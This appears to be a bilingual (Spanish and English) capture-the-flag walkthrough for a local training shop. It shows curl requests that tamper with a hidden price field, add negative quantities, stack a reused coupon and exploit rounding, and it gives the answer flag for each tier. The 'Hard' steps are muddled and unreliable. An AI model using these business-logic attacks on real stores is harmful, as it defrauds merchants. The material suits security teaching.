Easy — Manipulación de precio (client-side)

El precio se envía como campo oculto en el formulario. El servidor confía en el precio del cliente.

  1. Inspecciona el formulario "Add to Cart". El campo price es un input hidden con el precio en céntimos.
  2. Intercepta con Burp Suite o usa curl modificando el precio: 
    curl -X POST http://localhost:5000/shop/cart/add \
  -b "session=TU_SESSION" \
  -d "product_id=1&price=1&qty=1"
  3. Establece price=1 (1 céntimo). Con balance de $1.00, el checkout funciona.
  4. Flag: HL{bu51n355_l0g1c_0wn3d}

Medium — Cantidad negativa o coupon stacking

Añade un producto con cantidad negativa para restar del total, o aplica el mismo cupón múltiples veces.

  1. Cantidad negativa para reducir el total: 
    curl -X POST http://localhost:5000/shop/cart/add \
  -b "session=TU_SESSION" \
  -d "product_id=1&qty=-1"
  2. O aplica el mismo cupón múltiples veces (50% + 50% = 100% de descuento): 
    curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"
  3. Flag: HL{bu51n355_l0g1c_0wn3d}

Hard — Workflow bypass

Coupons se rastrean por sesión y los precios se validan en servidor. Usa el truco de redondeo de punto flotante o encadena operaciones de carrito.

  1. Añade artículos hasta que el total se redondee a ≤ $1.00 por truncamiento entero: 
    curl -X POST http://localhost:5000/shop/cart/add \
  -b "session=SESS" \
  -d "product_id=3&qty=1"
# Repite hasta que el total sea ≤ 100 céntimos por overflow/rounding
  2. Encadena: limpia el carrito entre requests para resetear el estado y probar distintos vectores: 
    curl -X POST http://localhost:5000/shop/cart/clear -b "session=SESS"
  3. Flag: HL{bu51n355_l0g1c_0wn3d}

Easy — Client-side price manipulation

The price is sent as a hidden form field. The server trusts the client-supplied price.

  1. Inspect the "Add to Cart" form. The price field is a hidden input with the price in cents.
  2. Intercept with Burp Suite or use curl to modify the price: 
    curl -X POST http://localhost:5000/shop/cart/add \
  -b "session=YOUR_SESSION" \
  -d "product_id=1&price=1&qty=1"
  3. Set price=1 (1 cent). With a $1.00 balance, checkout succeeds.
  4. Flag: HL{bu51n355_l0g1c_0wn3d}

Medium — Negative quantity or coupon stacking

Add a product with a negative quantity to subtract from the total, or apply the same coupon multiple times.

  1. Negative quantity to reduce the total: 
    curl -X POST http://localhost:5000/shop/cart/add \
  -b "session=YOUR_SESSION" \
  -d "product_id=1&qty=-1"
  2. Or apply the same coupon multiple times (50% + 50% = 100% off): 
    curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"
  3. Flag: HL{bu51n355_l0g1c_0wn3d}

Hard — Workflow bypass

Coupons are tracked per-session and prices are server-validated. Use floating-point rounding or chain cart operations.

  1. Add items until the total rounds down to ≤ $1.00 via integer truncation: 
    curl -X POST http://localhost:5000/shop/cart/add \
  -b "session=SESS" \
  -d "product_id=3&qty=1"
# Repeat until total is ≤ 100 cents due to overflow/rounding
  2. Chain: clear the cart between requests to reset state and test different vectors: 
    curl -X POST http://localhost:5000/shop/cart/clear -b "session=SESS"
  3. Flag: HL{bu51n355_l0g1c_0wn3d}
